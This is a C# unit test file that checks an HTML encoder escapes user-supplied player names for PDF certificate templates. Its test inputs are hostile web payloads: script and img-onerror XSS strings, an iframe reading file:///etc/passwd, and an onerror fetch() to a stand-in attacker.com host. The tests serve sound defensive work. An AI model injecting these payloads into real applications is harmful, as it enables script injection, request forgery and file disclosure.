// Copyright 2025 Carnegie Mellon University. All Rights Reserved.
// Released under a MIT (SEI)-style license. See LICENSE.md in the project root for license information.

using Gameboard.Api.Common.Services;

namespace Gameboard.Api.Tests.Unit;

public class HtmlEncoderTests
{
    [Theory]
    [InlineData("<script>alert('xss')</script>", "&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;")]
    [InlineData("Hello & goodbye", "Hello &amp; goodbye")]
    [InlineData("<img src=x onerror=\"alert('xss')\">", "&lt;img src=x onerror=&quot;alert(&#39;xss&#39;)&quot;&gt;")]
    [InlineData("Test <iframe src=\"javascript:alert(1)\"></iframe>", "Test &lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;")]
    public void Encode_WithMaliciousContent_EncodesSpecialCharacters(string input, string expected)
    {
        // when
        var result = HtmlEncoder.Encode(input);

        // then
        result.ShouldBe(expected);
    }

    [Theory]
    [InlineData("John Doe")]
    [InlineData("Alice & Bob")]
    [InlineData("Test <page>")]
    public void Encode_WithSafeContent_ReturnsEncodedString(string input)
    {
        // when
        var result = HtmlEncoder.Encode(input);

        // then - result should be encoded (no raw <, >, &, ", or ')
        result.ShouldNotContain("<");
        result.ShouldNotContain(">");
        result.ShouldNotContain("\""); // double quote should be encoded
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    public void Encode_WithNullOrEmpty_ReturnsEmptyString(string? input)
    {
        // when
        var result = HtmlEncoder.Encode(input);

        // then
        result.ShouldBe(string.Empty);
    }

    [Fact]
    public void Encode_WithWhitespace_ReturnsWhitespace()
    {
        // when
        var result = HtmlEncoder.Encode("   ");

        // then
        result.ShouldBe("   ");
    }

    [Fact]
    public void Encode_WithScriptTagInPlayerName_EncodesSoWkhtmltopdfCantExecute()
    {
        // certificate template substitution uses {{playerName}}, which comes from user-supplied
        // ?requestedNameOverride= query parameter. ensure this payload can't become a script tag
        var payload = "<script>alert('xss')</script>";
        var encoded = HtmlEncoder.Encode(payload);

        encoded.ShouldNotContain("<script>");
        encoded.ShouldContain("&lt;script&gt;");
    }

    [Fact]
    public void Encode_WithIframeFileUrlPayload_EncodesSoWkhtmltopdfCantFetch()
    {
        // even with --disable-local-file-access, encoding ensures the payload can't form
        // an iframe that wkhtmltopdf might try to process
        var payload = "<iframe src=\"file:///etc/passwd\"></iframe>";
        var encoded = HtmlEncoder.Encode(payload);

        encoded.ShouldNotContain("<iframe");
        encoded.ShouldContain("&lt;iframe");
    }

    [Fact]
    public void Encode_WithImageOnerrorSsrfPayload_EncodesSoJavascriptCantExecute()
    {
        // onerror handlers with fetch() are both an XSS vector (in user browsers) and
        // an SSRF vector (if wkhtmltopdf executes them). encoding both prevents both.
        var payload = "<img src=x onerror=\"fetch('http://attacker.com/beacon')\">";
        var encoded = HtmlEncoder.Encode(payload);

        // the raw img tag must be encoded
        encoded.ShouldNotContain("<img");
        encoded.ShouldContain("&lt;img");

        // with HTML entities for the quotes, wkhtmltopdf can't parse it as an onerror attribute
        encoded.ShouldContain("&quot;");
    }
}
